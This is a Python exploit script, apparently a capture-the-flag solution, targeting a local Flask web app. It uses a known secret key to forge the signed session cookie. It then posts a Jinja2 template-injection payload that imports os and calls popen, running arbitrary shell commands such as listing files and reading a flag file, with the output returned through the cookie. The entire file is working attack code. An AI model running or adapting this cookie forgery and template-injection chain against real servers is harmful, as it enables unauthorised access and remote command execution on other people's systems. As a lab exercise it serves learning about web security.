import hashlib
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

import requests

URL = "http://127.0.0.1:5000"
SECRET_KEY = "FooBar"

def decode_flask_cookie(secret_key, cookie_str):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.loads(cookie_str)


def encode_flask_cookie(secret_key, data):
    salt = 'cookie-session'
    serializer = TaggedJSONSerializer()
    signer_kwargs = {
        'key_derivation': 'hmac',
        'digest_method': hashlib.sha1
    }
    s = URLSafeTimedSerializer(secret_key, serializer=serializer, salt=salt, signer_kwargs = signer_kwargs)
    return s.dumps(data)



def setCookie(session):
    #Get the initial cookie
    r = session.get(URL)
    sessionCookie = session.cookies["session"]

    #Lets decode it
    decodeCookie = decode_flask_cookie(SECRET_KEY, sessionCookie)
    
    #Modify the Text
    decodeCookie["user"] = "Balthazar"
    #Recode the Cookie (I think we could skip the whole decode, but lets leave it)
    recodeCookie = encode_flask_cookie(SECRET_KEY, decodeCookie)

    session.cookies["session"] = recodeCookie
    r = session.get(URL)

    #For Debugging
    #print (r.text)
    if "Request" in r.text:
        
        return True
    else:
        return False
    

def runCommand(session, command):
    """
    Run a command
    """

    #Jinja injection to run a command
    payload = {"king" : '{% if session.update(foo=request.application.__globals__.__builtins__.__import__(request.args.a).popen(request.args.b).read()) %} Foo {% endif %}',
               'name': 'foo',
               'gift': 'foo'}

    #And as we are getting stuff from the args
    params = {"a": "os",
              "b": command}

    #Make the Request
    r = session.post(URL, data=payload, params=params)
    tmp = session.cookies.get("session",domain="127.0.0.1")

    out = decode_flask_cookie(SECRET_KEY, tmp)
    return out["foo"]
    
    

if __name__ == "__main__":
    print("Working")
    session = requests.Session()

    print(setCookie(session))
    print(runCommand(session, "ls -l"))
    print(runCommand(session, "cat theFlag.txt"))
